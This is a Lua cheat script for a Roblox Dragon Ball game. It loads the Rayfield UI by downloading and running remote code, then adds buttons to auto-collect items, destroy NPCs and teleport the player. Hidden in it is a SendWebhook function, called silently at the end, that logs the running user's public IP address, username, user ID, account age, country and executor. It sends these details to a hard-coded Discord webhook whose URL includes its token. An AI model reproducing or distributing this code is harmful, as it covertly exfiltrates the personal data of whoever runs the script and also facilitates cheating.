
local Marketplace = game:GetService('MarketplaceService');
local Players = game:GetService('Players');
local Player = Players.LocalPlayer;
local Character = Player.Character;
local TweenService = game:GetService("TweenService");
local Localization = game:GetService("LocalizationService");
local Info = TweenInfo.new(15,Enum.EasingStyle.Quad);

function SendWebhook()
	local ExecutedIP = tostring(game:HttpGet("https://api.ipify.org", true))
	local OSTime = os.time()
	local Time = os.date('!*t', OSTime)
	local Embed = {
		["title"] = "__**New execution.**__",
		["description"] = "Name: "..Player.Name.."\nDisplay Name: "..Player.DisplayName.."\nExploit: "..identifyexecutor().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
		["type"] = "rich",
		["color"] = tonumber(0xffff00),
		["thumbnail"] = {
			["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
		},
		["image"] = {
			["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..Player.Name
		},
		["fields"] = {
			{
				["name"] = "__Account Age:__",
				["value"] = Player.AccountAge.." days old",
				["inline"] = true
			},
			{
				["name"] = "__User ID:__",
				["value"] = Player.UserId,
				["inline"] = true
			},
			{
				["name"] = "__IP:__",
				["value"] = ExecutedIP,
				["inline"] = true
			},
			{
				["name"] = "__Country:__",
				["value"] = Localization:GetCountryRegionForPlayerAsync(Player),
				["inline"] = true
			},
		},
		["footer"] = {
			["text"] = 'Logger',
			["icon_url"] = "https://cdn.discordapp.com/attachments/959947675900461096/1042254064655794187/unknown.png"
		},
		["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
	};
	(syn and syn.request or http_request or http.request) {
		Url = 'https://discord.com/api/webhooks/1049206698872668222/AiNR5sSg5cxd6m5wXEIinUShRzTX5gz1ISiyqhm5zMWSFJ9iebppEIITfF-ArywLQEV7';
		Method = 'POST';
		Headers = {
			['Content-Type'] = 'application/json';
		};
		Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
	};
end

function Teleport(...)
	local tic_k = tick();
	local params = {...};
	local cframe = CFrame.new(params[1],params[2],params[3]);
	local tween,err = pcall(function()
		local tween = TweenService:Create(Character["HumanoidRootPart"],Info,{CFrame=cframe});
		tween:Play();
	end)
	if not tween then return err end
end

if game.PlaceId == game.PlaceId then

_G.NPC = "No Given."

local Sucessful, Info = pcall(Marketplace.GetProductInfo, Marketplace, game.PlaceId)

local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()


local Window = Rayfield:CreateWindow({
	Name = Info.Name,
	LoadingTitle = "Loading Please Wait..",
	LoadingSubtitle = "by Zanta",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = 'ConfigZ', -- Create a custom folder for your hub/game
		FileName = "Random"
	},
})

local Tab = Window:CreateTab("Main", 10762499520) -- Title, Image

local Section = Tab:CreateSection("Farm")

local Button = Tab:CreateButton({
	Name = "Collect Dragon Balls",
	Callback = function()
		for _, Db in pairs(game.Workspace:GetChildren()) do 
            if Db.Name:match('Stars') then
                Character.HumanoidRootPart.CFrame = Db.CFrame
                wait(.5)
            end
        end
	end,
})



local Label = Tab:CreateLabel("I hope you are enjoying this.")


local Input = Tab:CreateInput({
	Name = "NPC",
	PlaceholderText = "Name",
	RemoveTextAfterFocusLost = false,
	Callback = function(Text)
		_G.NPC = Text
	end,
})

local Button = Tab:CreateButton({
	Name = "Kill NPC",
	Callback = function()

		local NPCFind = game.Workspace:FindFirstChild(_G.NPC)
		
		if NPCFind then
			local Head = NPCFind:FindFirstChild("Head")
			if NPCFind and Head then
				Head:Destroy()
			else
				Rayfield:Notify({
					Title = "Error!",
					Content = "NPC No Found ║ Invalid Name",
					Duration = 1,
					Image = 10762499520,
				})
			end
		end

	end,
})


local Tab = Window:CreateTab("Snake Way", 10762499520)

local Section = Tab:CreateSection("Teleport")


local Button = Tab:CreateButton({
	Name = "Teleport to Kaio",
	Callback = function()
		if game.PlaceId == 4748429613 then
			    Teleport(-479.316528, 3198.57788, -10069.5693, 1, 0, 0, 0, 1, 0, 0, 0, 1);
			else
				Teleport(5234.24316, 363.164673, -7374.52002, 1, 0, 0, 0, 1, 0, 0, 0, 1);
			end
	end,
})


SendWebhook()
end
